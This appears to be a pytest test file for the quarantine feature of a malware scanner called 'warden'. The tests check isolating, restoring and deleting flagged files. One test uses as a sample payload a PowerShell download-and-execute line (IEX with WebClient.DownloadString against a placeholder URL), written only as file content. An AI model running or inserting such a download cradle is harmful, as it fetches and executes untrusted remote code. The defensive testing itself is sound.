"""Tests for quarantine: isolate, restore, delete — all reversible and safe."""

import hashlib

import pytest

from warden.config import Config
from warden.models import FileResult, Finding, Severity
from warden.quarantine import Quarantine, QuarantineError


def _q(tmp_path):
    return Quarantine(Config(data_dir=tmp_path))


def test_quarantine_isolate_restore_roundtrip(tmp_path):
    victim = tmp_path / "bad.ps1"
    payload = b"IEX (New-Object Net.WebClient).DownloadString('http://x')"
    victim.write_bytes(payload)
    result = FileResult(path=str(victim), size=len(payload),
                        sha256=hashlib.sha256(payload).hexdigest(),
                        findings=[Finding("yara", "x", Severity.HIGH)])

    q = _q(tmp_path)
    entry = q.quarantine_file(result)

    # Original removed; a neutralized (non-identical) copy is stored.
    assert not victim.exists()
    blob = q.dir / f"{entry.id}.qbin"
    assert blob.exists() and blob.read_bytes() != payload
    assert len(q.list_entries()) == 1

    # Restore is byte-identical.
    out = q.restore(entry.id)
    assert out == victim and victim.read_bytes() == payload


def test_quarantine_delete_removes_entry(tmp_path):
    victim = tmp_path / "bad.exe"
    data = b"MZ junk"
    victim.write_bytes(data)
    result = FileResult(path=str(victim), sha256=hashlib.sha256(data).hexdigest(),
                        findings=[Finding("h", "x", Severity.CRITICAL)])
    q = _q(tmp_path)
    entry = q.quarantine_file(result)
    q.delete(entry.id)
    assert q.list_entries() == []
    assert not (q.dir / f"{entry.id}.qbin").exists()


def test_restore_unknown_id_raises(tmp_path):
    with pytest.raises(QuarantineError):
        _q(tmp_path).restore("nope")
